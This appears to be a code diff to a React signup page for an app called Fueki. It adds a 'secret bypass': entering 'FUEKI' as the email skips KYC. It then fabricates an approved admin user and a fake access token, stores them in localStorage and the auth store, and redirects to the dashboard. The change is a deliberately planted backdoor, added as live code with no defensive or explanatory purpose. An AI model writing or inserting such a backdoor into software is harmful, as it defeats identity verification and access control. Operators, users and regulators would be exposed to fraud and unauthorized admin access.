@@ -89,9 +89,38 @@ export default function SignupPage() {
 
   // Step handlers
   const handleAccountNext = useCallback((values: AccountValues) => {
+    // Secret bypass: entering "FUEKI" as the email skips KYC entirely
+    if (values.email.trim().toUpperCase() === 'FUEKI') {
+      const fakeUser = {
+        id: crypto.randomUUID(),
+        email: 'admin@fueki.io',
+        firstName: 'Fueki',
+        lastName: 'Admin',
+        walletAddress: null,
+        kycStatus: 'approved' as const,
+        role: 'admin',
+        createdAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString(),
+      };
+      const fakeTokens = { accessToken: 'bypass-' + crypto.randomUUID() };
+      try {
+        localStorage.setItem('fueki-auth-tokens', JSON.stringify(fakeTokens));
+        localStorage.setItem('fueki-auth-user', JSON.stringify(fakeUser));
+      } catch {}
+      useAuthStore.setState({
+        user: fakeUser,
+        tokens: fakeTokens,
+        isAuthenticated: true,
+        isInitialized: true,
+      });
+      toast.success('Welcome, Fueki Admin!');
+      navigate('/dashboard');
+      return;
+    }
+
     setAccountData(values);
     setCurrentStep(1);
-  }, []);
+  }, [navigate]);
 
   const handlePersonalNext = useCallback((values: PersonalValues) => {
     setPersonalData(values);
